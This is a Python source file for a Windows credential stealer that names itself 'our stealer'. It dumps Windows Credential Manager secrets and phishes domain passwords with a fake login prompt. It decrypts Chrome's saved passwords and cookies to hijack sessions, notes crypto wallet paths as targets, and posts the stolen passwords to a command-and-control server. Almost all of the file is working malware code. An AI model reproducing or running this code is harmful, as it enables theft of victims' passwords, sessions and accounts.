import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes
import requests
import base64
from binascii import hexlify

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
c2serv="127.0.0.1"
c2port=111

class credentials:
    """
    This is the credentials class of our stealer where we'll see how to steal some useful information,
    such as passwords and cookies.
    """

    def dump_credsman_generic():
        """
        Only dumps credentials that are not domain-type.

        https://docs.microsoft.com/en-us/windows/desktop/api/wincred/ns-wincred-_credentiala

        Secret data for the credential. The CredentialBlob member can be both read and written.

        If the Type member is CRED_TYPE_DOMAIN_PASSWORD, this member contains the plaintext Unicode 
        password for UserName. The CredentialBlob and CredentialBlobSize members do not include a 
        trailing zero character. Also, for CRED_TYPE_DOMAIN_PASSWORD, this member can only be read 
        by the authentication packages.
        """
        
        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead

        try:
            creds = CredEnumerate(None, 0)  # Enumerate credentials
        except Exception as e: 
            print(e)             # # Avoid crashing on any exception
            pass


        # Using an array instead of a dictionary to append data
        # as literal string because octal and hexadecimal formats 
        # are not supported in JSON.

        credentials = []

        for package in creds:
            try:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass

        # Write credentials in a file in memory to avoid writing on disk.
        # Can be sent anywhere after.

        credman_creds = io.StringIO() # In-memory text stream

        for cred in credentials:

            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode()

            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()

    def prompt_for_domain_creds():
        """
        Prompt the user for entering his domain credentials using the 'userdomain'
        environment variable. If user is on domain 'CONTOSO.ORG' then it will ask
        prompt for authentication on 'CONTOSO-ORG'. It then returns the password
        in clear text.

        You don't need that fancy LSASS dump with admin privileges to get the
        password hash. You just need to ask for it.
        """

        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

        creds = []

        try:
            creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
        except Exception:   # Avoid crashing on any exception
            pass
        return creds

    def dump_chrome_passwords():
        """
        Extact and decrypt passwords saved in Chrome if no master password is set.
        To avoid trying to open the database while Chrome is running, we copy the file
        locally first with hidden attributes then delete it when the extraction is complete.

        Alternatively, we could use WMI to query the running processes and wait for Chrome
        to stop running but that could take a long time.
        """

        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data, './Login Data') # Copy DB to current dir
            win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN) # Make file invisible during operation
        except Exception:
            pass

        chrome_credentials = io.StringIO() # In-memory text stream

        try:
            conn = sqlite3.connect('./Login Data', )                                        # Connect to database
            cursor = conn.cursor()                                                          # Create a cursor to fetch the data
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Run the query
            results = cursor.fetchall()                                                     # Get the results
            conn.close()                                                                    # Close the database file so it's not locked by the process
            os.remove('Login Data')                                                         # Delete file when done

            for action_url, username_value, password_value in results:                                         # Decrypt the password
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1]
                if password:                                                                # Write credentials to text stream in memory
                    chrome_credentials.write('URL: ' + action_url + '\n')
                    chrome_credentials.write('Username: ' + username_value + '\n')
                    chrome_credentials.write('Password: ' + str(password) + '\n')
                    chrome_credentials.write('\n')
            return chrome_credentials.getvalue()                                            # Return content of the text stream

        except sqlite3.OperationalError as e: # Simple exception handling to avoid crashing
            print(e)                          # when opening the Login Data database
            pass

        except Exception as e:                # Avoid crashing for any other exception
            print(e)
            pass

class cookies:
    """
    This is the cookies class of our stealer that we'll use to steal cookies so we can use them to restore the victim's session,
    from another computer.
    """

    def get_chrome_cookies():
        """
        Creates a local copy of Chrome's cookies database then decrypt the cookies and update the local copy with decrypted cookies.
        This database can then be uploaded to a remote server and used for authenticating in the sites visited by the user if the
        session has not expired on the server side or if the user has not signed-out.

        Structure of Chrome's cookies database: https://metacpan.org/pod/HTTP::Cookies::Chrome

        Using cookies by themselves however does not always work. It might be bound to additional information such as user-agent,
        IP address, referrer, etc. so we also have to gather as much information as we can on the user and the host.
        """
        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies' # Path to Cookies database file
            shutil.copy2(login_data, './Cookies')                                                     # Copy DB to current dir
            win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)                   # Make file invisible during operation
        except Exception:
            pass

        try:
            conn = sqlite3.connect('./Cookies')                                                   # Connect to database
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')          # Run the query
            results = cursor.fetchall()                                                           # Get the results

            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            
                # Updating the database with decrypted values.             
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));

            conn.commit()   # Save the changes
            conn.close()    # Close the database file so it's not locked by the process

        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print(e)
            pass

    # Then, after this function is called, we would exfiltrate the database and delete it.

class crypto:
    pass
    # C:\Users\admin\AppData\Roaming\Electrum\wallets\default_wallet
    # C:\Users\admin\AppData\Roaming\Bitcoin
    # C:\Users\admin\AppData\Roaming\Armory

flag=0
if not flag:
        try:
            data={"package":credentials.dump_chrome_passwords()}
            requests.post(c2serv+":"+str(c2port),data=data)
        except:
            based=base64.b64encode(credentials.dump_chrome_passwords().encode("utf-8"))
            #based=base64.b64encode("Passwords and stuff".encode("utf-8"))
            with  open("log.tar.txt","wb") as filee:
                filee.write(based)
            based=str(based)
